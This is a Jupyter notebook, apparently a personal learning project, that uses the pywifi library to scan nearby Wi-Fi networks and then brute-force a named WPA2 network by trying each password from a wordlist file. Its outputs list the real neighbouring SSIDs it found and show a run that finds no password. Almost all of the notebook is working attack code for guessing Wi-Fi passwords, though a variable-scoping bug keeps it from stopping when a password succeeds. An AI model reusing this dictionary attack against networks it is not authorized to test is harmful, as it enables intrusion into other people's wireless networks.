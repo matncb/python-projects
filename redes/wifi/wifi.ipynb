{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 99,
   "metadata": {},
   "outputs": [],
   "source": [
    "import pywifi\n",
    "import time\n",
    "from pywifi import const\n",
    "from threading import Thread\n",
    "from IPython.display import clear_output"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 100,
   "metadata": {},
   "outputs": [],
   "source": [
    "available_devices = []\n",
    "passwords = []\n",
    "final_output = None\n",
    "\n",
    "wifi = pywifi.PyWiFi()\n",
    "interface = wifi.interfaces()[0]\n",
    "#interface.name()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 101,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "      matncb\n",
      "      Tintin\n",
      "      Tintin\n",
      "      #NET-CLARO-WIFI\n",
      "      AP_4135148482\n",
      "      CLARO_2G238F53\n",
      "      Claudio\n",
      "      matncb\n"
     ]
    }
   ],
   "source": [
    "def wifi_scan():\n",
    "    interface.scan()\n",
    "    time.sleep(5)\n",
    "    redes = interface.scan_results()\n",
    "\n",
    "    for i in redes:\n",
    "        available_devices.append(i.ssid)\n",
    "\n",
    "    for i in available_devices:\n",
    "        print(\"{:<5} {:}\".format(\"\", i))\n",
    "\n",
    "wifi_scan()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 102,
   "metadata": {},
   "outputs": [],
   "source": [
    "def load_password():\n",
    "    with open('pwd.txt','r') as f:\n",
    "        for i in f:\n",
    "            i = i.replace('\\n','')\n",
    "            if i not in passwords:\n",
    "                passwords.append(i)\n",
    "\n",
    "load_password()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 103,
   "metadata": {},
   "outputs": [],
   "source": [
    "wifi_name = 'matncb'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 104,
   "metadata": {},
   "outputs": [],
   "source": [
    "def crack_pwd(pwd):\n",
    "    profile = pywifi.Profile()\n",
    "    profile.ssid = wifi_name\n",
    "    profile.auth = const.AUTH_ALG_OPEN\n",
    "    profile.akm.append(const.AKM_TYPE_WPA2PSK)\n",
    "    profile.cipher = const.CIPHER_TYPE_CCMP\n",
    "\n",
    "    #pwd=pwd.strip()\n",
    "    profile.key = pwd\n",
    "    interface.remove_all_network_profiles()\n",
    "    profile = interface.add_network_profile(profile)\n",
    "\n",
    "    interface.connect(profile)\n",
    "    time.sleep(5)\n",
    "    if interface.status() == const.IFACE_CONNECTED:\n",
    "        final_output = pwd\n",
    "        print('Password is ',final_output)\n",
    "    else:\n",
    "        #print('Its not password ', pwd)\n",
    "        pass"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 105,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Processing... 100.0%\n",
      "----------------------------------------\n",
      "Finished. No password found.\n"
     ]
    }
   ],
   "source": [
    "def main():\n",
    "    cont = 0\n",
    "    size = len(passwords)\n",
    "    \n",
    "    for pwd in passwords:\n",
    "        cont += 1\n",
    "        if final_output == None:\n",
    "            print(\"Processing... \" + str(round(cont/size * 100, 2)) + str(\"%\"), end ='\\r')\n",
    "            #Thread(target = crack_pwd, args=(pwd,)).start()\n",
    "            crack_pwd(pwd)\n",
    "        else:\n",
    "            break\n",
    "\n",
    "    time.sleep(10)\n",
    "    print()\n",
    "    print(\"-\"*40)\n",
    "\n",
    "    if final_output != None:\n",
    "        print('Finished. Password is ', final_output)\n",
    "    else:\n",
    "        print('Finished. No password found.')\n",
    "\n",
    "main()"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.10"
  },
  "orig_nbformat": 4,
  "vscode": {
   "interpreter": {
    "hash": "61cd7254479848ce9bae052e5520b020024ace1352f961bf0a9a5af526a14ef2"
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
